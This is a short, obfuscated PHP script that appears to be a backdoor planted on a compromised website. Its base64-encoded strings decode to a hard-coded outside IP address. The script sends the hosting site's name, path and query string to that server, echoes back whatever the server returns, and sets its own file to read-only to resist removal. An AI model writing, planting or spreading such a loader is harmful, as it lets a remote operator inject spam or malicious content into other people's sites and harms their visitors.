<?php
set_time_limit(0);
$url1 = $_SERVER['PHP_SELF'];  
$name= substr($url1 ,strrpos($url1 ,'/')+1 );
chmod($name,0444);
header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$a = base64_decode("aHR0cDovLzExOC4xOTMuMTUzLjIzL3lhemkv");
$b = base64_decode("aHR0cDovLw==") . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
$c = file_get_contents($a . base64_decode("L2luZGV4LnBocD9ob3N0PQ==") . $b . "&url=" . $_SERVER['QUERY_STRING'] . "&domain=" . $_SERVER['SERVER_NAME']);
echo $c;
?>